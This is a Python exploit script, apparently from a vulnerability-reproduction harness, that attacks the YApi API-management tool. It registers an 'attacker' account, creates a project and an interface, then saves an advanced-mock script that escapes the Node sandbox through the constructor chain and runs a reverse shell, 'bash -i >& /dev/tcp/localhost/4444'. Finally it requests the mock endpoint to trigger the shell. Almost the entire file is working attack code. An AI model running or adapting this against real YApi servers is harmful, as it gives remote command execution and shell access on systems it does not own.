#!/usr/bin/env python3
"""Register a YApi user and launch a shell through an advanced Mock script."""

import http.cookiejar
import json
import os
import secrets
import time
import urllib.error
import urllib.request


SHELL_COMMAND = "bash -c 'bash -i >& /dev/tcp/localhost/4444 0>&1'"


def request_json(
    opener: urllib.request.OpenerDirector,
    url: str,
    payload: dict | None = None,
) -> tuple[int, dict]:
    body = None if payload is None else json.dumps(payload).encode("utf-8")
    request = urllib.request.Request(
        url,
        data=body,
        headers={"Content-Type": "application/json"} if body else {},
    )
    try:
        response = opener.open(request, timeout=20)
    except urllib.error.HTTPError as error:
        response = error
    with response:
        content = response.read().decode("utf-8")
        return response.status, json.loads(content)


def call_api(
    opener: urllib.request.OpenerDirector,
    base_url: str,
    route: str,
    payload: dict | None = None,
) -> object:
    status, response = request_json(opener, f"{base_url}/api/{route}", payload)
    if status != 200 or response.get("errcode") != 0:
        raise RuntimeError(f"YApi {route} failed with HTTP {status} and code {response.get('errcode')}")
    return response.get("data")


def prepare_mock(
    opener: urllib.request.OpenerDirector,
    base_url: str,
) -> tuple[int, str]:
    suffix = secrets.token_hex(8)
    call_api(
        opener,
        base_url,
        "user/reg",
        {
            "email": f"attacker-{suffix}@local.invalid",
            "username": f"attacker-{suffix}",
            "password": secrets.token_urlsafe(24),
        },
    )
    groups = call_api(opener, base_url, "group/list")
    group = next(group for group in groups if group.get("role") == "owner")
    project = call_api(
        opener,
        base_url,
        "project/add",
        {
            "name": f"test-{suffix}",
            "group_id": group["_id"],
            "group_name": group["group_name"],
            "project_type": "private",
            "basepath": "",
        },
    )
    project_id = project["_id"]
    categories = call_api(
        opener,
        base_url,
        f"interface/getCatMenu?project_id={project_id}",
    )
    interface = call_api(
        opener,
        base_url,
        "interface/add",
        {
            "project_id": project_id,
            "catid": categories[0]["_id"],
            "title": "test",
            "path": f"/probe-{suffix}",
            "method": "GET",
            "res_body_type": "json",
            "res_body": '{"ok":true}',
        },
    )
    script = (
        'const process = this.constructor.constructor("return process")(); '
        'process.mainModule.require("child_process").exec('
        + json.dumps(SHELL_COMMAND)
        + '); mockJson = {ok: true}'
    )
    call_api(
        opener,
        base_url,
        "plugin/advmock/save",
        {
            "project_id": project_id,
            "interface_id": interface["_id"],
            "mock_script": script,
            "enable": True,
        },
    )
    return project_id, suffix


def main() -> None:
    base_url = (os.environ.get("REMOTE_TARGET_URL") or os.environ["LOCAL_TARGET_URL"]).rstrip("/")
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar())
    )
    project_id, suffix = prepare_mock(opener, base_url)
    status, response = request_json(
        opener,
        f"{base_url}/mock/{project_id}/probe-{suffix}",
    )
    if status != 200 or response.get("ok") is not True:
        raise RuntimeError(f"Mock endpoint returned HTTP {status}")
    time.sleep(3)
    print(json.dumps({"evidence_payload": {}, "request_status": status}))


if __name__ == "__main__":
    main()
